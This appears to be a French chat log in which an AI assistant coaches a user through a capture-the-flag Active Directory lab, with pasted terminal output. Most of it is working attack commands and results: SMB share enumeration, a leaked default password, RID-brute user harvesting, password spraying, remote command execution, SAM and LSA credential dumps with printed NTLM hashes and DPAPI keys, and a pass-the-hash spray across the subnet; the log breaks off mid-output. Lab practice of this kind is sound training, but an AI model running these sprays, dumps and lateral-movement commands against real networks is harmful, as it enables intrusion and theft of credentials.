SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.30     445    WK-030           [*] Enumerated shares

SMB         10.13.37.30     445    WK-030           Share           Permissions     Remark

SMB         10.13.37.30     445    WK-030           -----           -----------     ------

SMB         10.13.37.30     445    WK-030           ADMIN$                          Remote Admin

SMB         10.13.37.30     445    WK-030           C$                              Default share

SMB         10.13.37.30     445    WK-030           IPC$            READ            Remote IPC

SMB         10.13.37.10     445    WK-010           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.20     445    WK-020           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.10     445    WK-010           [*] Enumerated shares

SMB         10.13.37.10     445    WK-010           Share           Permissions     Remark

SMB         10.13.37.10     445    WK-010           -----           -----------     ------

SMB         10.13.37.10     445    WK-010           ADMIN$                          Remote Admin

SMB         10.13.37.10     445    WK-010           C$                              Default share

SMB         10.13.37.10     445    WK-010           IPC$            READ            Remote IPC

SMB         10.13.37.124    445    WK-124           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.20     445    WK-020           [*] Enumerated shares

SMB         10.13.37.20     445    WK-020           Share           Permissions     Remark

SMB         10.13.37.20     445    WK-020           -----           -----------     ------

SMB         10.13.37.20     445    WK-020           ADMIN$                          Remote Admin

SMB         10.13.37.20     445    WK-020           C$                              Default share

SMB         10.13.37.20     445    WK-020           IPC$            READ            Remote IPC

SMB         10.13.37.42     445    DC-CELESTINA     [*] Enumerated shares

SMB         10.13.37.42     445    DC-CELESTINA     Share           Permissions     Remark

SMB         10.13.37.42     445    DC-CELESTINA     -----           -----------     ------

SMB         10.13.37.42     445    DC-CELESTINA     ADMIN$                          Remote Admin

SMB         10.13.37.42     445    DC-CELESTINA     C$                              Default share

SMB         10.13.37.42     445    DC-CELESTINA     HUB             READ            A public share for all CELESTINA's employees

SMB         10.13.37.42     445    DC-CELESTINA     IPC$            READ            Remote IPC

SMB         10.13.37.42     445    DC-CELESTINA     NETLOGON        READ            Logon server share 

SMB         10.13.37.42     445    DC-CELESTINA     SYSVOL          READ            Logon server share 

SMB         10.13.37.124    445    WK-124           [*] Enumerated shares

SMB         10.13.37.124    445    WK-124           Share           Permissions     Remark

SMB         10.13.37.124    445    WK-124           -----           -----------     ------

SMB         10.13.37.124    445    WK-124           ADMIN$                          Remote Admin

SMB         10.13.37.124    445    WK-124           C$                              Default share

SMB         10.13.37.124    445    WK-124           IPC$            READ            Remote IPC

SMB         10.13.37.101    445    WK-101           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.101    445    WK-101           [*] Enumerated shares

SMB         10.13.37.101    445    WK-101           Share           Permissions     Remark

SMB         10.13.37.101    445    WK-101           -----           -----------     ------

SMB         10.13.37.101    445    WK-101           ADMIN$                          Remote Admin

SMB         10.13.37.101    445    WK-101           C$                              Default share

SMB         10.13.37.101    445    WK-101           IPC$            READ            Remote IPC

SMB         10.13.37.137    445    WK-137           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.44     445    WK-044           [*] Enumerated shares

SMB         10.13.37.44     445    WK-044           Share           Permissions     Remark

SMB         10.13.37.44     445    WK-044           -----           -----------     ------

SMB         10.13.37.44     445    WK-044           ADMIN$                          Remote Admin

SMB         10.13.37.44     445    WK-044           C$                              Default share

SMB         10.13.37.44     445    WK-044           IPC$            READ            Remote IPC

SMB         10.13.37.137    445    WK-137           [*] Enumerated shares

SMB         10.13.37.137    445    WK-137           Share           Permissions     Remark

SMB         10.13.37.137    445    WK-137           -----           -----------     ------

SMB         10.13.37.137    445    WK-137           ADMIN$                          Remote Admin

SMB         10.13.37.137    445    WK-137           C$                              Default share

SMB         10.13.37.137    445    WK-137           IPC$            READ            Remote IPC

SMB         10.13.37.222    445    WK-222           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.155    445    WK-155           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.222    445    WK-222           [*] Enumerated shares

SMB         10.13.37.222    445    WK-222           Share           Permissions     Remark

SMB         10.13.37.222    445    WK-222           -----           -----------     ------

SMB         10.13.37.222    445    WK-222           ADMIN$                          Remote Admin

SMB         10.13.37.222    445    WK-222           C$                              Default share

SMB         10.13.37.222    445    WK-222           IPC$            READ            Remote IPC

SMB         10.13.37.111    445    WK-111           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.155    445    WK-155           [*] Enumerated shares

SMB         10.13.37.155    445    WK-155           Share           Permissions     Remark

SMB         10.13.37.155    445    WK-155           -----           -----------     ------

SMB         10.13.37.155    445    WK-155           ADMIN$                          Remote Admin

SMB         10.13.37.155    445    WK-155           C$                              Default share

SMB         10.13.37.155    445    WK-155           IPC$            READ            Remote IPC

SMB         10.13.37.234    445    WK-234           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.111    445    WK-111           [*] Enumerated shares

SMB         10.13.37.111    445    WK-111           Share           Permissions     Remark

SMB         10.13.37.111    445    WK-111           -----           -----------     ------

SMB         10.13.37.111    445    WK-111           ADMIN$                          Remote Admin

SMB         10.13.37.111    445    WK-111           C$                              Default share

SMB         10.13.37.111    445    WK-111           IPC$            READ            Remote IPC

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.234    445    WK-234           [*] Enumerated shares

SMB         10.13.37.234    445    WK-234           Share           Permissions     Remark

SMB         10.13.37.234    445    WK-234           -----           -----------     ------

SMB         10.13.37.234    445    WK-234           ADMIN$                          Remote Admin

SMB         10.13.37.234    445    WK-234           C$                              Default share

SMB         10.13.37.234    445    WK-234           IPC$            READ            Remote IPC

SMB         10.13.37.132    445    WK-132           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.123    445    WK-123           [*] Enumerated shares

SMB         10.13.37.123    445    WK-123           Share           Permissions     Remark

SMB         10.13.37.123    445    WK-123           -----           -----------     ------

SMB         10.13.37.123    445    WK-123           ADMIN$                          Remote Admin

SMB         10.13.37.123    445    WK-123           C$                              Default share

SMB         10.13.37.123    445    WK-123           IPC$            READ            Remote IPC

SMB         10.13.37.123    445    WK-123           Todo                            

SMB         10.13.37.202    445    WK-202           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.132    445    WK-132           [*] Enumerated shares

SMB         10.13.37.132    445    WK-132           Share           Permissions     Remark

SMB         10.13.37.132    445    WK-132           -----           -----------     ------

SMB         10.13.37.132    445    WK-132           ADMIN$                          Remote Admin

SMB         10.13.37.132    445    WK-132           C$                              Default share

SMB         10.13.37.132    445    WK-132           IPC$            READ            Remote IPC

SMB         10.13.37.202    445    WK-202           [*] Enumerated shares

SMB         10.13.37.202    445    WK-202           Share           Permissions     Remark

SMB         10.13.37.202    445    WK-202           -----           -----------     ------

SMB         10.13.37.202    445    WK-202           ADMIN$                          Remote Admin

SMB         10.13.37.202    445    WK-202           C$                              Default share

SMB         10.13.37.202    445    WK-202           IPC$            READ            Remote IPC

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 09:48:42 (CEST)] exegol-free /workspace # 

On tient une excellente piste !

En scannant les partages, ton terminal te montre deux choses qui sortent de l'ordinaire. Regarde bien les résultats :

Sur le Contrôleur de Domaine (DC-CELESTINA - 10.13.37.42) :
Il y a un partage nommé HUB avec les droits de lecture (READ). La remarque dit : "A public share for all CELESTINA's employees".

Sur la machine WK-123 (10.13.37.123) :
Il y a un partage nommé Todo. On ne voit pas explicitement "READ", mais le fait que le nom remonte est un énorme indicateur qu'il faut aller y jeter un œil.

Étape 1 : Explorer le partage HUB
On va se connecter au partage "HUB" sur le Contrôleur de Domaine en utilisant l'outil smbclient (qui fonctionne comme un client FTP).

Lance cette commande (il te demandera le mot de passe, tape Password123!) :

Bash
smbclient //10.13.37.42/HUB -U 'pentester'
Une fois connecté (ton prompt deviendra smb: \>), tape la commande dir ou ls pour lister les fichiers.
Si tu vois un fichier intéressant, télécharge-le avec la commande get nom_du_fichier.txt.
Ensuite, tape exit pour quitter.

Étape 2 : Explorer le partage Todo
Même chose pour l'autre machine, WK-123 :

Bash
smbclient //10.13.37.123/Todo -U 'pentester'
Tape dir à l'intérieur, télécharge ce que tu trouves avec get, puis exit.

Astuce : Une fois les fichiers téléchargés sur ton Exegol, lis-les avec la commande cat nom_du_fichier.

Dis-moi ce que tu as trouvé dans ces deux dossiers partagés !

[May 18, 2026 - 09:48:42 (CEST)] exegol-free /workspace # smbclient //10.13.37.42/HUB -U 'pentester'

Password for [WORKGROUP\pentester]:

session setup failed: NT_STATUS_LOGON_FAILURE

[May 18, 2026 - 09:49:41 (CEST)] exegol-free /workspace # smbclient //10.13.37.42/HUB -U 'pentester'

Password for [WORKGROUP\pentester]:

Try "help" to get a list of possible commands.

smb: \> ls

  .                                   D        0  Wed Mar 19 14:06:23 2025

  ..                                DHS        0  Mon May 26 16:34:22 2025

  notice.pdf                          A    34224  Fri Sep 20 17:34:54 2024



16687103 blocks of size 4096. 13684656 blocks available

smb: \> 

Super, tu es dedans ! La première erreur NT_STATUS_LOGON_FAILURE était sûrement juste une petite faute de frappe sur le mot de passe, c'est classique.

Tu as trouvé un fichier : notice.pdf. Les fichiers PDF ou les documents Word dans les partages publics d'entreprise sont des mines d'or pour les pentest, ils contiennent souvent des mots de passe par défaut pour les nouveaux employés ou des instructions de connexion.

Voici exactement comment le récupérer et le lire depuis ton terminal sans interface graphique :

Étape 1 : Télécharger le fichier
Puisque tu es toujours dans l'invite smb: \>, lance cette commande pour télécharger le fichier sur ta machine Exegol :

Bash
get notice.pdf
Ensuite, quitte smbclient pour revenir à ton terminal normal :

Bash
exit
Étape 2 : Lire le PDF en ligne de commande
Si tu fais un simple cat notice.pdf, ton terminal va afficher des caractères illisibles. Exegol possède des outils pour extraire le texte des PDF.

Utilise pdftotext pour le convertir, puis lis-le :

Bash
pdftotext notice.pdf
cat notice.txt
(Si pdftotext n'est pas installé sur ta version light d'Exegol, tu peux extraire le texte brut avec la commande strings notice.pdf | less).

Étape 3 : N'oublie pas la deuxième cible !
Pendant que tu épluches ce PDF, n'oublie pas qu'on avait repéré un autre partage très suspect nommé Todo sur la machine 10.13.37.123.

Dès que tu as fini avec le PDF, va faire la même manipulation sur l'autre machine :

Bash
smbclient //10.13.37.123/Todo -U 'pentester'
(Mot de passe : Password123!)

Dis-moi ce que cache ce PDF (as-tu trouvé un flag ou un nouveau mot de passe ?) et ce que tu trouves dans le dossier Todo !

[May 18, 2026 - 09:50:46 (CEST)] exegol-free /workspace # pdftotext notice.pdf

cat notice.txt

zsh: command not found: pdftotext

cat: notice.txt: No such file or directory

Ah, la version exegol-free a encore frappé ! L'outil pdftotext (qui fait partie du paquet poppler-utils) n'est pas préinstallé pour garder l'image légère.

Ce n'est pas grave, un pentester a toujours plus d'un tour dans son sac. Voici trois alternatives pour lire le contenu ou extraire les secrets de ce PDF directement dans ton terminal.

1. La méthode "Quick & Dirty" (Recommandée)
L'outil strings extrait absolument tout le texte lisible d'un fichier binaire. C'est brut, mais c'est parfait pour repérer un mot de passe ou un flag au milieu du code source du PDF :

Bash
strings notice.pdf | less
(Utilise les flèches haut/bas pour naviguer, et appuie sur la touche q pour quitter).

Si tu veux gagner du temps, tu peux même filtrer directement les mots intéressants :

Bash
strings notice.pdf | grep -i "password\|mdp\|compte\|admin\|flag\|user"
2. La méthode "Propre" (Installation)
Puisque ton conteneur a accès à Internet (tu l'as vu en téléchargeant rockyou.txt), tu peux tout simplement installer l'outil manquant en 10 secondes :

Bash
apt update && apt install poppler-utils -y
pdftotext notice.pdf
cat notice.txt
3. Le réflexe "Métadonnées" (Pro-Tip)
Dans les CTF, il arrive très souvent que l'auteur cache des indices, des noms d'utilisateurs ou un flag directement dans les propriétés du document (Auteur, Titre, Logiciel de création, etc.). C'est un réflexe à avoir :

Bash
exiftool notice.pdf
Essaie l'une de ces méthodes et dis-moi ce que tu découvres dans cette notice ! (Et garde dans un coin de ta tête qu'il te reste le partage Todo à explorer sur la machine 10.13.37.123).

[May 18, 2026 - 09:50:51 (CEST)] exegol-free /workspace # strings notice.pdf | less

[May 18, 2026 - 09:51:51 (CEST)] exegol-free /workspace # apt update && apt install poppler-utils -y

pdftotext notice.pdf

cat notice.txt

Hit:1 http://deb.debian.org/debian bookworm InRelease

Hit:2 https://packages.microsoft.com/repos/azure-cli bookworm InRelease                                                                                                                                 

Hit:3 https://packages.microsoft.com/debian/12/prod bookworm InRelease                                                                                                                                  

Hit:4 http://deb.debian.org/debian bookworm-updates InRelease                                                                                                                                           

Hit:5 http://deb.debian.org/debian-security bookworm-security InRelease                                                                                                                                 

Hit:6 http://deb.debian.org/debian sid InRelease                                                                                                                                                        

Hit:7 https://debian.neo4j.com stable InRelease                                                                                                                                                         

Get:8 https://pkgs.tailscale.com/stable/ubuntu focal InRelease                                                                                                                                          

Get:9 https://dl.yarnpkg.com/debian stable InRelease                                                                                                                                                    

Err:1 http://deb.debian.org/debian bookworm InRelease

  At least one invalid signature was encountered.

Err:2 https://packages.microsoft.com/repos/azure-cli bookworm InRelease

  At least one invalid signature was encountered.

Err:3 https://packages.microsoft.com/debian/12/prod bookworm InRelease

  At least one invalid signature was encountered.

Err:4 http://deb.debian.org/debian bookworm-updates InRelease

  At least one invalid signature was encountered.

Err:5 http://deb.debian.org/debian-security bookworm-security InRelease

  At least one invalid signature was encountered.

Err:6 http://deb.debian.org/debian sid InRelease

  At least one invalid signature was encountered.

Err:7 https://debian.neo4j.com stable InRelease

  At least one invalid signature was encountered.

Err:8 https://pkgs.tailscale.com/stable/ubuntu focal InRelease

  At least one invalid signature was encountered.

Err:9 https://dl.yarnpkg.com/debian stable InRelease

  At least one invalid signature was encountered.

Reading package lists... Done

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://deb.debian.org/debian bookworm InRelease: At least one invalid signature was encountered.

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://packages.microsoft.com/repos/azure-cli bookworm InRelease: At least one invalid signature was encountered.

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://packages.microsoft.com/debian/12/prod bookworm InRelease: At least one invalid signature was encountered.

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://deb.debian.org/debian bookworm-updates InRelease: At least one invalid signature was encountered.

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://deb.debian.org/debian-security bookworm-security InRelease: At least one invalid signature was encountered.

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://deb.debian.org/debian sid InRelease: At least one invalid signature was encountered.

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://debian.neo4j.com stable InRelease: At least one invalid signature was encountered.

W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://pkgs.tailscale.com/stable/ubuntu focal InRelease: At least one invalid signature was encountered.

W: GPG error: https://dl.yarnpkg.com/debian stable InRelease: At least one invalid signature was encountered.

E: The repository 'https://dl.yarnpkg.com/debian stable InRelease' is not signed.

N: Updating from such a repository can't be done securely, and is therefore disabled by default.

N: See apt-secure(8) manpage for repository creation and user configuration details.

zsh: command not found: pdftotext

cat: notice.txt: No such file or directory

[May 18, 2026 - 09:52:12 (CEST)] exegol-free /workspace # apt install pdftotext                     

Reading package lists... Done

Building dependency tree... Done

Reading state information... Done

E: Unable to locate package pdftotext

[May 18, 2026 - 09:52:54 (CEST)] exegol-free /workspace # pdftotext notice.pdf                      

cat notice.txt

zsh: command not found: pdftotext

cat: notice.txt: No such file or directory

[May 18, 2026 - 09:52:59 (CEST)] exegol-free /workspace # 

Ah, les joies des conteneurs Linux avec des signatures GPG expirées ! Ton système refuse de mettre à jour les paquets (apt update) car les clés de sécurité des dépôts sont obsolètes, donc impossible d'installer poppler-utils.

Oublie l'installation, on va rester sur les outils de base qui sont déjà présents sur ta machine.

La méthode infaillible (sans rien installer)
On va utiliser l'outil strings. Il est natif sur 100% des systèmes Linux. Il va lire le PDF et t'afficher uniquement les caractères compréhensibles par un humain.

Tape exactement cette commande :

Bash
strings notice.pdf | grep -C 3 -i "password\|mdp\|compte\|admin\|flag\|user\|password123"
(Le grep -C 3 permet d'afficher les 3 lignes avant et après le mot clé pour avoir le contexte).

Si jamais ça ne donne rien de lisible, tu peux forcer l'affichage de tout le texte du PDF en le faisant défiler toi-même :

Bash
strings notice.pdf | less
(Dans la fenêtre less, utilise les flèches pour monter/descendre, et tape q pour quitter).

Et n'oublie pas la deuxième cible !
Pendant que tu cherches dans ce PDF, rappelle-toi qu'on avait repéré un partage nommé Todo sur la machine WK-123 (10.13.37.123).

Connecte-toi dessus avec cette commande :

Bash
smbclient //10.13.37.123/Todo -U 'pentester'
(Mot de passe : Password123!)

Dis-moi ce que strings a révélé dans le PDF, ou ce que tu as trouvé dans le dossier Todo !

voici le contenu du fichier : Attention All Users: Default Password Update

To ensure enhanced security measures, we are updating the default password policy for new user

accounts.

Effective Immediately:

The new default password for all user accounts is:

C3L3stin4!Us3r

Please follow the steps below:

1. Login: Use your username and the new default password to log into your account.

2. Change Password: Upon first login, you must change your password. Follow the on-screen

instructions to set a new, strong password of your choice.

3. Password Security: Ensure your new password meets the following criteria:

• At least 18 characters long

• Includes a mix of upper and lower case letters, numbers, and special characters

• Avoid using easily guessable words or personal information

If you experience any issues or have any questions, please contact the IT support team.

Thank you for your cooperation.

Best regards,

IT Security Team

Celestina

Bingo ! Tu as mis la main sur le Graal des failles de configuration : un mot de passe par défaut documenté !

Le fichier indique clairement que tous les nouveaux comptes utilisateurs sont créés avec le mot de passe : C3L3stin4!Us3r

Même si le document précise que l'utilisateur "doit changer son mot de passe à la première connexion", dans la réalité des entreprises (et surtout des labos de pentest), il y a toujours un compte oublié, un stagiaire qui n'est jamais venu, ou un compte de service mal configuré qui a gardé ce mot de passe.

L'attaque finale pour trouver le pivot
On va balancer ce mot de passe par défaut sur tous les utilisateurs du domaine (nous en avions 90 selon BloodHound) et voir si l'un d'entre eux l'utilise encore.

Puisque nous n'avons pas de fichier avec la liste des utilisateurs, nous allons laisser NetExec (anciennement CrackMapExec) interroger le DC pour récupérer la liste tout seul, puis tester ce mot de passe.

Voici ta commande de frappe :

Bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --rid-brute | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
(Cette commande va extraire silencieusement tous les noms d'utilisateurs de l'Active Directory et les sauvegarder dans un fichier users.txt).

Ensuite, on teste ce fameux mot de passe sur tout le monde et sur tout le réseau :

Bash
nxc smb 10.13.37.0/24 -u users.txt -p 'C3L3stin4!Us3r' --continue-on-success
Regarde attentivement les résultats de cette deuxième commande.

Est-ce qu'un utilisateur ressort avec un succès [+] ?

Plus important encore, est-ce que cet utilisateur te donne enfin le précieux (Pwn3d!) sur une des machines (WK-XXX) ?

voici le retour de la commande

C'est magnifique ! Tu as trouvé la clé de voûte de cette première partie de l'audit.

En regardant tes logs, on voit très clairement que le mot de passe par défaut C3L3stin4!Us3r fonctionne pour deux nouveaux utilisateurs :

d.folt

a.nozer

Et surtout, regarde cette ligne magique sur la machine WK-123 (10.13.37.123) :
[+] celestina.shop\a.nozer:C3L3stin4!Us3r (admin)

L'utilisateur a.nozer est Administrateur Local de la machine WK-123 ! Cela signifie que nous avons enfin un contrôle total sur une machine du réseau, ce qui nous permet d'exécuter des commandes à distance.

La découverte du réseau secret (Le fameux Pivot !)
Maintenant que nous sommes administrateurs de WK-123, on peut enfin lancer notre commande ipconfig pour vérifier si cette machine possède deux cartes réseau (une dans le 10.13.37.X et l'autre dans le réseau secret 10.37.13.X).

Lance cette commande :

Bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -x 'ipconfig'
Si le résultat te montre bien une adresse IP en 10.37.13.X, c'est gagné ! Nous utiliserons cette machine comme rebond (Proxy/Pivot) pour scanner et attaquer le deuxième réseau ! Dis-moi ce que retourne l'ipconfig !

[May 18, 2026 - 10:07:55 (CEST)] exegol-free /workspace # nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -x 'ipconfig'

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\a.nozer:C3L3stin4!Us3r (admin)

SMB         10.13.37.123    445    WK-123           [+] Executed command via wmiexec

SMB         10.13.37.123    445    WK-123           Windows IP Configuration

SMB         10.13.37.123    445    WK-123           Ethernet adapter Ethernet0 2:

SMB         10.13.37.123    445    WK-123              Connection-specific DNS Suffix  . :

SMB         10.13.37.123    445    WK-123              Link-local IPv6 Address . . . . . : fe80::159d:1ce7:e982:351b%5

SMB         10.13.37.123    445    WK-123              IPv4 Address. . . . . . . . . . . : 10.13.37.123

SMB         10.13.37.123    445    WK-123              Subnet Mask . . . . . . . . . . . : 255.255.255.0

SMB         10.13.37.123    445    WK-123              Default Gateway . . . . . . . . . : 10.13.37.1

[May 18, 2026 - 10:11:41 (CEST)] exegol-free /workspace # 

Plot twist ! Fausse alerte pour le pivot. L'ipconfig est formel : WK-123 n'a qu'une seule carte réseau. Ce n'est donc pas notre passerelle vers le réseau secret 10.37.13.0/24.

Mais ce n'est absolument pas un échec, c'est comme ça qu'un pentest progresse ! Tu viens de débloquer une étape majeure du scénario.

Le pillage post-exploitation
Que fait un pentester lorsqu'il devient Administrateur Local d'une nouvelle machine ? Il la pille.

Puisque nous avons les pleins pouvoirs sur WK-123, nous pouvons demander à NetExec de fouiller dans la mémoire de la machine et dans ses fichiers systèmes protégés pour extraire tous les mots de passe et les hashs des utilisateurs qui s'y sont connectés récemment. C'est la technique du "Credential Dumping". Il y a de très fortes chances qu'un compte encore plus privilégié traîne dans la mémoire de cette machine !

Lance ces deux commandes l'une après l'autre pour vider la mémoire et les secrets locaux de WK-123 :

1. Extraction de la base SAM (les mots de passe locaux) :

Bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' --sam
2. Extraction des secrets LSA (souvent des mots de passe en clair ou d'autres comptes) :

Bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' --lsa
Regarde bien les retours de ces commandes. Y a-t-il un nouveau nom d'utilisateur (comme un Administrateur) avec un mot de passe en clair ou un hash NT (la partie de droite après les :) qui apparaît ?

[May 18, 2026 - 10:11:41 (CEST)] exegol-free /workspace # nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' --sam

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\a.nozer:C3L3stin4!Us3r (admin)

SMB         10.13.37.123    445    WK-123           [*] Dumping SAM hashes

SMB         10.13.37.123    445    WK-123           Administrator:500:aad3b435b51404eeaad3b435b51404ee:fafb12f22417628bb6422e9bb8686f5c:::

SMB         10.13.37.123    445    WK-123           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.13.37.123    445    WK-123           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.13.37.123    445    WK-123           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:226e3799ac9c5359a8e1a6043278c383:::

SMB         10.13.37.123    445    WK-123           [+] Added 4 SAM hashes to the database

[May 18, 2026 - 10:12:40 (CEST)] exegol-free /workspace # nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' --lsa

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\a.nozer:C3L3stin4!Us3r (admin)

SMB         10.13.37.123    445    WK-123           [*] Dumping LSA secrets

SMB         10.13.37.123    445    WK-123           CELESTINA.SHOP/a.nozer:$DCC2$10240#a.nozer#5a3e3a4d0847522cfca438ff9e73b7ce: (2025-03-19 09:58:12)

SMB         10.13.37.123    445    WK-123           CELESTINA\WK-123$:aes256-cts-hmac-sha1-96:b853d16594a848eed90bce0ac2aaa2c02bbc8f577b8078b3e410b2b9791b3a59

SMB         10.13.37.123    445    WK-123           CELESTINA\WK-123$:aes128-cts-hmac-sha1-96:f052e79400ac3fbede8338895dedb596

SMB         10.13.37.123    445    WK-123           CELESTINA\WK-123$:des-cbc-md5:2957c7ef0e896e16

SMB         10.13.37.123    445    WK-123           CELESTINA\WK-123$:plain_password_hex:32c0e613507f7153e5c60081a76b05f249c34d889c3fb817dcbf544f582864d61e3f165d29c6940d47e41b2d9b3687f558f75459f935e314fb86987642ed25272c07081ff13b6de95656e8096f1154176c60f0129896a3ea21209e9248fc950c315a9beffc7e9926a5b3d0d14878a5f0688700b15b5560d90224827b3f372dcfe5dc2af282e678054a59f362eca27a12ec2ee0572df78cded256eb561a747d69fb6fa466f6a629f3bda946ed8f955c9481bd9f7132cb978900092237fe821aea03660a2d64ac8642b35ee7c8ef166b79e8f9608b00beb0a0e2c72b4640c3f8b1863ddc6a990075254f3365659868cf2b

SMB         10.13.37.123    445    WK-123           CELESTINA\WK-123$:aad3b435b51404eeaad3b435b51404ee:c5d20fe6ac65ba1ff5c4270cb0771cae:::

SMB         10.13.37.123    445    WK-123           flag4:CCHDFLM{DumP1nG_H45h3s_L1k3_4_B0ss}

SMB         10.13.37.123    445    WK-123           dpapi_machinekey:0x805f8992d6f3de5fad996abbbed38e56f47f4f6d

dpapi_userkey:0xb952203485c2a35819636fadd8f1698b3592ccf8

Can't open SECURITY\Policy\Secrets\DSREGCMD\CurrVal subKey

SMB         10.13.37.123    445    WK-123           [+] Dumped 8 LSA secrets to /root/.nxc/logs/lsa/WK-123_10.13.37.123_2026-05-18_101245.secrets and /root/.nxc/logs/lsa/WK-123_10.13.37.123_2026-05-18_101245.cached

[May 18, 2026 - 10:12:51 (CEST)] exegol-free /workspace # 

BINGO ! Tu as tapé dans le mille. Le pillage de la machine a été extrêmement rentable !

Voici les deux énormes découvertes dans tes logs :

1. Un Flag (Objectif CTF)
Dans l'extraction des secrets LSA, l'administrateur avait littéralement stocké un flag en clair :
CCHDFLM{DumP1nG_H45h3s_L1k3_4_B0ss}
Tu peux aller le valider dans ton interface de labo !

2. Le Hash de l'Administrateur Local (Pass-The-Hash)
Dans l'extraction de la base SAM, tu as récupéré le hash NTLM du compte Administrator (le compte administrateur intégré de Windows, reconnaissable à son ID 500) :
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fafb12f22417628bb6422e9bb8686f5c:::
(Note : La première partie aad3b... est un vieux résidu LM vide, la vraie valeur NT qui nous intéresse est celle de droite).

Même si tu n'as pas le mot de passe en clair, le protocole d'authentification Microsoft permet de s'authentifier directement avec ce hash. C'est l'attaque du Pass-The-Hash (PtH).

Très souvent, les entreprises déploient leurs machines à partir d'une même "image" de base (master), ce qui signifie que le mot de passe de l'Administrateur Local est souvent identique sur toutes les machines du parc.

La nouvelle attaque : Propager le Hash
On va utiliser ce hash avec NetExec sur tout le réseau .13.37.0/24 pour voir si cet Administrateur Local a les mêmes droits sur d'autres postes. N'oublie pas le paramètre --local-auth pour dire à NetExec qu'on attaque un compte local et non un compte du domaine.

Lance cette commande :

Bash
nxc smb 10.13.37.0/24 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth
Observe les résultats ! Si une nouvelle machine te donne le (Pwn3d!), relance la commande sur cette machine spécifique en ajoutant -x 'ipconfig' à la fin pour voir si c'est enfin notre fameuse passerelle vers le réseau caché 10.37.13.0/24.

[May 18, 2026 - 10:32:45 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:WK-010) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:WK-044) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:WK-030) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:WK-020) (signing:False) (SMBv1:None)

